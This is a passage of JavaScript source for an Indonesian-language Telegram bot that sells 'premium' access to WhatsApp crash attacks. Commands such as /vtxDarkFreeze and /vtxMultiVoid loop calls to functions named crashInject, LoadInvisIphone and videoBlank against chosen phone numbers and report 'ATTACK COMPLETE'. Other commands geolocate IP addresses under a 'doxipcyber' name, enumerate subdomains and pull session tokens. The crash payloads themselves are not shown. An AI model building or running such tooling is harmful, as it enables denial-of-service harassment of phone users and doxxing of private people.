                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }

const valtix = sessions.values().next().value; // Ambil socket WhatsApp pertama
        if (!valtix) {
            return bot.sendMessage(chatId, "❌ Tidak ada koneksi WhatsApp aktif.");
        }

            const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/f5147v.jpg", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let a = 0; a < 40; a++) {
    if (a % 2 === 0) {
        await eventFlowres(valtix, jid);
        console.log(`[${a}] → Mode 1: eventFlowres`);
    } else {
        await LoadInvisIphone(valtix, jid);
        console.log(`[${a}] → Mode 2: LoadInvisIphone`);
    }

    await new Promise(r => setTimeout(r, 1500)); // jeda tiap putaran
}
        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });           

bot.onText(/\/vtxDarkFreeze (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const target = match[1];
            const formattedNumber = target.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }
            
const valtix = sessions.values().next().value; // Ambil socket WhatsApp pertama
        if (!valtix) {
            return bot.sendMessage(chatId, "❌ Tidak ada koneksi WhatsApp aktif.");
        }

            const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/f5147v.jpg", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let a = 0; a < 10; a++) {

    if (a % 2 === 0) {
        await eventFlowres(valtix, jid);
        console.log(`[${a}] → Mode 1: eventFlowres`);
    } else {
        await videoBlank(valtix, jid);
        console.log(`[${a}] → Mode 2: videoBlank`);
    }

    await new Promise((r) => setTimeout(r, 1500));
}

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });           

  bot.onText(/\/vtxMultiVoid\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  
  // Parse semua nomor dari input
  const numbersInput = match[1];
  const targets = parseMultiNumbers(numbersInput);
  
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const jidat = getCurrentDate();

  // === SECURITY CHECKS ===
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "```\nあなたはクレイクスではない```",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 Buy Acces", url: "https://t.me/Thaureyo" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (targets.length === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada nomor valid yang ditemukan. Format: /vtxmultivoid 628123 628456");
  }

  try {
    const valtix = sessions.values().next().value;
    if (!valtix) {
      return bot.sendMessage(chatId, "❌ Tidak ada koneksi WhatsApp aktif.");
    }

    // Kirim progress video
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/f5147v.jpg", {
      caption: `\`\`\`
❏ Target: ${targets.length} nomor
❏ Status: Preparing...
❏ Progress: [░░░░░░░░░░] 0%
❏ Effect: Multi-Blank Bug
\`\`\``,
      parse_mode: "Markdown"
    });

    // Progress stages yang lebih smooth
    const progressStages = [
      { text: "[█░░░░░░░░░] 10%", delay: 150 },
      { text: "[██░░░░░░░░] 20%", delay: 150 },
      { text: "[████░░░░░░] 40%", delay: 100 },
      { text: "[██████░░░░] 60%", delay: 100 },
      { text: "[████████░░] 80%", delay: 100 },
      { text: "[██████████] 100%", delay: 200 }
    ];

    // Loop per target
    for (let t = 0; t < targets.length; t++) {
      const number = targets[t];
      const jid = `${number}@s.whatsapp.net`;
      const progress = Math.floor(((t + 1) / targets.length) * 100);

      // Update progress per nomor
      await bot.editMessageCaption(`\`\`\`
❏ Target: ${number} (${t+1}/${targets.length})
❏ Status: Sending...
❏ Progress: [${'█'.repeat(Math.floor(progress/10))}${'░'.repeat(10-Math.floor(progress/10))}] ${progress}%
❏ Effect: Multi- Bug
\`\`\``, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      });

      // Kirim bug ke target
      try {
        console.log(chalk.red(`[MULTIVOID] ${number} Sedang Di Ewe...`));
        
        // Loop 20x per target
        for (let a = 0; a < 60; a++) { // jumlah bisa kamu ubah bebas

    if (a % 3 === 0) {
        await Carousel(valtix, jid);
        console.log(`[${a}] → Mode 1: Carousel`);
        
    } else if (a % 3 === 1) {
        await eventFlowres(valtix, jid);
        console.log(`[${a}] → Mode 2: eventFlowres`);

    } else {
        await crashInject(valtix, jid);
        console.log(`[${a}] → Mode 3: crashInject`);
    }

    await new Promise(r => setTimeout(r, 1500));
}
      } catch (error) {
        console.error(chalk.red(`❌ Gagal ke ${number}:`, error.message));
        // Lanjut ke nomor berikutnya jika 1 nomor gagal
        continue;
      }
    }

    // Final update
    await bot.editMessageCaption(`\`\`\`
✅ SUCCESS!
❏ Target: ${targets.length} nomor
❏ Status: All bugs delivered
❏ Progress: [██████████] 100%
❏ Date: ${jidat}
\`\`\``, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "🔥 ATTACK COMPLETE", callback_data: "done" }]]
      }
    });

  } catch (error) {
    console.error("Global Error:", error);
    bot.sendMessage(chatId, `❌ Gagal: ${error.message}`);
  }
});

                                                  
//=======plugins=======//
bot.onText(/\/tiktok (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url.includes("tiktok.com")) {
    return bot.sendMessage(chatId, "⚠️ *URL TikTok tidak valid!*", {
      parse_mode: "Markdown",
    });
  }

  try {
    const result = await tiktokDl(url);
    const video = result.video_links.find((v) => v.type === "nowatermark");

    if (!video) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Gagal mendapatkan video tanpa watermark!*",
        { parse_mode: "Markdown" }
      );
    }

    const caption =
      `📌 *${result.title}*\n` +
      `👤 *${result.author.nickname}*\n` +
      `🎥 *${result.stats.views}* views\n` +
      `❤️ *${result.stats.likes}* likes\n` +
      `💬 *${result.stats.comment}* comments\n` +
      `🔄 *${result.stats.share}* shares\n` +
      `📅 *Diunggah:* ${result.taken_at}\n` +
      `⏳ *Durasi:* ${result.duration}`;

    await bot.sendVideo(chatId, video.url, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ *Gagal mengambil video:* ${err.message}`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/^\/grouponly (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Group Only* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to admin users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to Prem until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the Prem list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a Vip user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the Vip list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No Vip users found.");
  }

  let message = "𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 ‼️";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove Vip users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delvip 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the Vip list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the regis list.`);
});

bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/^\/cekid(\s|$)/i, async (msg) => {
const chatId = msg.chat.id;
const user = msg.from;
const text = `USERNAME : ${user.username ? '@' + user.username : 'Tidak ada'}
ID : ${chatId}`;
bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'Markdown',
        reply_to_message_id: msg.message_id
    });
}); 

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
  try {
    const OWNER_ID = 8306103837; // Ganti dengan ID owner kamu
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = (match[1] || "").trim();
    const name = msg.from.first_name || "Tanpa Nama";

    if (!text)
      return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi permintaan fitur>");

    const message = `
📩 *Permintaan Fitur Baru*  
👤 Dari: ${name}  
🆔 ID: ${userId}  

💬 Pesan:  
${text}
    `;

    await bot.sendMessage(OWNER_ID, message, { parse_mode: "Markdown" });
    await bot.sendMessage(chatId, "✅ Permintaan fitur kamu sudah dikirim ke owner.");
  } catch (err) {
    console.error("❌ Error di /reqfitur:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengirim permintaan fitur.");
  }
});

bot.onText(/^\/spotifysearch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "🔎 Nyari lagu di Spotify... tunggu bentar bre 🎧");

    const api = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result || !data.result.length) {
      return bot.sendMessage(chatId, "❌ Gagal nemuin lagu di Spotify bre!");
    }

    let caption = "🎶 *Hasil Pencarian Spotify:*\n\n";

    data.result.slice(0, 10).forEach((item, i) => {
      caption += `*${i + 1}. ${item.title}*\n`;
      caption += `👤 ${item.artist}\n`;
      caption += `🕒 ${item.duration}\n`;
      caption += `🔗 [Buka Spotify](${item.url})\n\n`;
    });

    // Kirim cover + caption
    bot.sendPhoto(chatId, data.result[0].cover, {
      caption,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("Spotify Search Error:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencari lagu di Spotify bre.");
  }
});

bot.onText(/\/whois(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const domain = match[1];

  if (!domain) return bot.sendMessage(chatId, "❗ Gunakan:\n/whois google.com");

  try {
    const { data } = await axios.get(`https://api.api-ninjas.com/v1/whois?domain=${domain}`, {
      headers: { "X-Api-Key": "API_KEY_KAMU" } // daftar gratis api-ninjas.com
    });

    const result = `
🔎 *WHOIS Lookup — ${domain}*
• Registrar: ${data.registrar || "N/A"}
• Created: ${data.created || "N/A"}
• Expire: ${data.expiration_date || "N/A"}
• Updated: ${data.updated_date || "N/A"}
• Name Server: ${data.name_servers?.join(", ") || "N/A"}
    `;

    bot.sendMessage(chatId, result, { parse_mode: "Markdown" });

  } catch (e) {
    bot.sendMessage(chatId, "❌ WHOIS tidak ditemukan / API belum dipasang.");
  }
});

bot.onText(/\/reversedns (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1];

  try {
    const res = await axios.get(`https://dns.google/resolve?name=${ip}.in-addr.arpa&type=PTR`);
    const dns = res.data.Answer?.[0]?.data || "Tidak ada PTR";

    bot.sendMessage(chatId, `📡 Reverse DNS:\n${dns}`);

  } catch {
    bot.sendMessage(chatId, `❌ Tidak dapat memproses reverse DNS untuk IP ${ip}`);
  }
});

bot.onText(/\/finger (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  try {
    const response = await axios.get(url, { timeout: 5000 });

    const headers = response.headers;
    bot.sendMessage(
      chatId,
      `
🛰 *Web Fingerprint — ${url}*
• Server: ${headers.server || "Unknown"}
• Powered By: ${headers["x-powered-by"] || "Unknown"}
• Content-Type: ${headers["content-type"] || "Unknown"}
• Cookies: ${headers["set-cookie"]?.length || 0} ditemukan
      `,
      { parse_mode: "Markdown" }
    );

  } catch {
    bot.sendMessage(chatId, "❌ Gagal mendeteksi fingerprint (website down / https strict)");
  }
});

bot.onText(/\/subdomain (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const domain = match[1];

  bot.sendMessage(chatId, `🔍 Mencari subdomain publik *${domain}*...`);

  try {
    const { data } = await axios.get(`https://api.hackertarget.com/hostsearch/?q=${domain}`);
    const results = data.split("\n").slice(0, 50);

    bot.sendMessage(chatId, `🛰 *Subdomain ditemukan* (${results.length})\n\`\`\`${results.join("\n")}\`\`\``, { parse_mode: "Markdown" });

  } catch {
    bot.sendMessage(chatId, "❌ Subdomain tidak dapat ditemukan.");
  }
});

bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const command = match[1];
  const ip = match[2]?.trim(); // bisa kosong

  try {
    // kalau ip kosong, ambil IP publik si user
    const targetIP = ip || (await axios.get("https://api.ipify.org?format=json")).data.ip;

    await bot.sendMessage(chatId, `🌍 Mengecek informasi IP *${targetIP}*...`, {
      parse_mode: "Markdown",
    });

    // Ambil data IP dari ipwho.is
    const { data: res } = await axios.get(`https://ipwho.is/${targetIP}`);

    if (!res.success) {
      return bot.sendMessage(chatId, `❌ Gagal menemukan informasi untuk IP *${targetIP}*`, {
        parse_mode: "Markdown",
      });
    }

    // Format hasil
    const info = `
*📡 Informasi IP*
• IP: ${res.ip || "N/A"}
• Type: ${res.type || "N/A"}
• Country: ${res.country || "N/A"} ${res.flag?.emoji || ""}
• Region: ${res.region || "N/A"}
• City: ${res.city || "N/A"}
• Latitude: ${res.latitude || "N/A"}
• Longitude: ${res.longitude || "N/A"}
• ISP: ${res.connection?.isp || "N/A"}
• Org: ${res.connection?.org || "N/A"}
• Domain: ${res.connection?.domain || "N/A"}
• Timezone: ${res.timezone?.id || "N/A"}
• Local Time: ${res.timezone?.current_time || "N/A"}
`;

    if (res.latitude && res.longitude) {
      await bot.sendLocation(chatId, res.latitude, res.longitude);
    }

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("TrackIP Error:", err);
    bot.sendMessage(chatId, `❌ Error: Tidak dapat mengambil data IP.`, {
      parse_mode: "Markdown",
    });
  }
});

const FormData = require("form-data");

// /veo3 prompt (HARUS reply foto)
bot.onText(/^\/Ai(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1]?.trim();
  const reply = msg.reply_to_message;

  try {
    // Validasi reply foto
    if (!reply || !reply.photo) {
      return bot.sendMessage(chatId, `⚠️ Reply foto lalu kirim:\n/veo3 "prompt"`);
    }

    if (!prompt) {
      return bot.sendMessage(chatId, "⚠️ Tambahkan prompt untuk video!");
    }

    await fs.ensureDir("./temp");

    // Ambil foto resolusi tertinggi
    const photo = reply.photo[reply.photo.length - 1];
    const file = await bot.getFile(photo.file_id);

    const tokenToUse = bot.token || process.env.TELEGRAM_TOKEN;
    if (!tokenToUse) {
      return bot.sendMessage(chatId, "❌ Token bot tidak ditemukan.");
    }

    const fileUrl = `https://api.telegram.org/file/bot${tokenToUse}/${file.file_path}`;

    const tempPath = path.join(
      "./temp",
      `${Date.now()}_${path.basename(file.file_path)}`
    );

    // Download foto
    const writer = fs.createWriteStream(tempPath);
    const response = await axios.get(fileUrl, { responseType: "stream" });
    response.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    // Upload ke tmpfiles (WAJIB pakai form-data dari npm)
    const formData = new FormData();
    formData.append("file", fs.createReadStream(tempPath));

    const upload = await axios.post(
      "https://tmpfiles.org/api/v1/upload",
      formData,
      { headers: formData.getHeaders() }
    );

    await fs.unlink(tempPath);

    const imageUrl = upload.data.data.url.replace(
      "tmpfiles.org/",
      "tmpfiles.org/dl/"
    );

    const loading = await bot.sendMessage(
      chatId,
      "⏳ Sedang membuat video dari image..."
    );

    // Payload API
    const payload = {
      videoPrompt: prompt,
      videoAspectRatio: "16:9",
      videoDuration: 5,
      videoQuality: "540p",
      videoModel: "v4.5",
      videoImageUrl: imageUrl,
      videoPublic: false,
    };

    // Generate task
    let taskId;
    try {
      const gen = await axios.post(
        "https://veo31ai.io/api/pixverse-token/gen",
        payload,
        { headers: { "Content-Type": "application/json" } }
      );
      taskId = gen.data.taskId;
    } catch (err) {
      console.log("GEN ERROR RAW:", err.response?.data || err);
      return bot.editMessageText(
        `❌ Error dari server:\n<code>${JSON.stringify(
          err.response?.data || err,
          null,
          2
        )}</code>`,
        { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
      );
    }

    if (!taskId) {
      return bot.editMessageText(
        "❌ Gagal membuat task video (taskId kosong)",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    // Tunggu video selesai
    let videoUrl;
    const timeout = Date.now() + 180000;

    while (Date.now() < timeout) {
      const res = await axios.post(
        "https://veo31ai.io/api/pixverse-token/get",
        {
          taskId,
          videoPublic: false,
          videoQuality: "540p",
          videoAspectRatio: "16:9",
          videoPrompt: prompt,
        }
      );

      if (res.data?.videoData?.url) {
        videoUrl = res.data.videoData.url;
        break;
      }

      await new Promise((r) => setTimeout(r, 5000));
    }

    if (!videoUrl) {
      return bot.editMessageText(
        "❌ Video belum tersedia atau gagal dibuat.",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    await bot.editMessageText(
      `✅ Video berhasil dibuat!\n📎 ${videoUrl}`,
      { chat_id: chatId, message_id: loading.message_id }
    );
  } catch (err) {
    console.log("GLOBAL ERROR RAW:", err.response?.data || err);

    bot.sendMessage(
      chatId,
      `❌ Error:\n<code>${JSON.stringify(
        err.response?.data || err.message,
        null,
        2
      )}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/^\/getsession$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil session...");

    const { data } = await axios.get("https://joocode.zone.id/api/getsession", {
      params: {
        domain: config.DOMAIN,
        plta: config.PLTA_TOKEN,
        pltc: config.PLTC_TOKEN,
      },
    });

    const tmpPath = path.join(process.cwd(), "Session.json");
    fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2), "utf-8");

    await bot.sendDocument(chatId, tmpPath, {
      caption: "📦 Session file requested",
    });

    fs.unlinkSync(tmpPath); // hapus file setelah dikirim

  } catch (err) {
    console.error("GetSession Error:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil session.\n${err.message}`);
  }
});

bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
